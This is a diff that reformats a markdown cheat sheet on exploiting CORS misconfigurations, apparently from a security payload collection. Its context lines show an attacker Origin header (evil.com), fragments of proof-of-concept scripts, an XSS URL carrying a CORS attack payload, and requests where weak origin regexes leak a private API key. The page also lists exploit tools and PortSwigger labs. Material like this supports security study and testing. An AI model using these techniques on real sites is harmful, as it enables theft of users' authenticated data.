@@ -1,7 +1,6 @@
 # CORS Misconfiguration
 
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 
-
+> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.
 
 ## Summary
 
@@ -16,7 +15,6 @@
 * [Labs](#labs)
 * [References](#references)
 
-
 ## Tools
 
 * [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
@@ -25,13 +23,11 @@
 * [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
 * [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
 
-
 ## Requirements
 
 * BURP HEADER> `Origin: https://evil.com`
 * VICTIM HEADER> `Access-Control-Allow-Credential: true`
 * VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
-
 
 ## Methodology
 
@@ -70,7 +66,7 @@ function reqListener() {
 };
 ```
 
-or 
+or
 
 ```html
 <html>
@@ -105,7 +101,7 @@ It's possible that the server does not reflect the complete `Origin` header but
 that the `null` origin is allowed. This would look like this in the server's
 response:
 
-```
+```ps1
 GET /endpoint HTTP/1.1
 Host: victim.example.com
 Origin: null
@@ -145,7 +141,7 @@ exploit codes from above do not work. But if you have an XSS on a trusted
 origin, you can inject the exploit coded from above in order to exploit CORS
 again.
 
-```
+```ps1
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
@@ -154,7 +150,7 @@ https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 If the server responds with a wildcard origin `*`, **the browser does never send
 the cookies**. However, if the server does not require authentication, it's still
 possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then 
+that are not accessible from the Internet. The attacker's website can then
 pivot into the internal network and access the server's data without authentication.
 
 ```powershell
@@ -188,16 +184,15 @@ function reqListener() {
 };
 ```
 
-
 ### Expanding the Origin
 
 Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
 
 #### Vulnerable Implementation (Example 1)
 
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server. 
+In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
 
-```
+```ps1
 GET /endpoint HTTP/1.1
 Host: api.example.com
 Origin: https://evilexample.com
@@ -207,7 +202,6 @@ Access-Control-Allow-Origin: https://evilexample.com
 Access-Control-Allow-Credentials: true 
 
 {"[private API key]"}
-
 ```
 
 #### Proof of Concept (Example 1)
@@ -230,7 +224,7 @@ function reqListener() {
 
 In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
 
-```
+```ps1
 GET /endpoint HTTP/1.1
 Host: api.example.com
 Origin: https://apiiexample.com
@@ -240,7 +234,6 @@ Access-Control-Allow-Origin: https://apiiexample.com
 Access-Control-Allow-Credentials: true 
 
 {"[private API key]"}
-
 ```
 
 #### Proof of concept (Example 2)
@@ -259,7 +252,6 @@ function reqListener() {
 };
 ```
 
-
 ## Labs
 
 * [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
@@ -267,17 +259,16 @@ function reqListener() {
 * [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
 * [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
-
 ## References
 
-- [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
-- [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
-- [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://hackerone.com/reports/426147)
-- [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://hackerone.com/reports/430249)
-- [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://hackerone.com/reports/168574)
-- [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
-- [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://portswigger.net/web-security/cors)
-- [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://hackerone.com/reports/235200)
-- [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
-- [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
-- [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
+* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
+* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
+* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://hackerone.com/reports/426147)
+* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://hackerone.com/reports/430249)
+* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://hackerone.com/reports/168574)
+* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
+* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://portswigger.net/web-security/cors)
+* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://hackerone.com/reports/235200)
+* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
+* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
+* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
